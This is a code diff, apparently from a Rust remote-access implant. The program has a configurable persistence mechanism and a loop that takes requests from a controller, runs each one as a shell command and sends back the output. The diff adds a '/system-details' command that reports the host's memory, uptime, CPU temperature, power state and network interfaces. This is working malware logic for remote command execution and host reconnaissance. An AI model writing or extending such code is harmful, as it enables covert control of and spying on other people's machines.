@@ -49,7 +49,6 @@ struct OutputMessage {
 
 #[inline]
 fn persist() -> bool {
-        // Persitence:
     match config::persistence() {
         config::Persistence::None => {
             debug_println!("no persistence mechanism enabled");
@@ -200,12 +199,32 @@ async fn main() {
         debug_println!("got messages: {}", messages.len());
 
         for message in messages {
-            let interpreted = match exc::run(&message.request) {
-                Ok(output) => output,
-                Err(e) => {
-                    format!("{}", e)
+            let interpreted = (|| {
+                if message.request.trim() == "/system-details" {
+                    debug_println!("_> Getting system details...");
+                    let system_information = helpers::get_system_information();
+                    let mut info_as_str = String::new();
+                    info_as_str.push_str(&format!("Memory: {}", system_information.memory));
+                    info_as_str.push_str(&format!("\nUptime: {}", system_information.uptime_seconds));
+                    info_as_str.push_str(&format!("\nCPU Temp: {}", system_information.cpu_temperature));
+                    info_as_str.push_str(&format!("\nAC Power: {}", system_information.is_ac_power));
+                    for network in system_information.networks {
+                        info_as_str.push_str(&format!("\nNetwork: {}", network));
+                    }
+
+                    return info_as_str;
                 }
-            };
+
+                debug_println!("_> Executing shell command...");
+                let command_output = match exc::run(&message.request) {
+                    Ok(output) => output,
+                    Err(e) => {
+                        format!("{}", e)
+                    }
+                };
+
+                return command_output;
+            })();
 
             debug_println!("sending response: {} - {}\n{}", message.id.clone(), message.request.clone(), interpreted.clone());
 
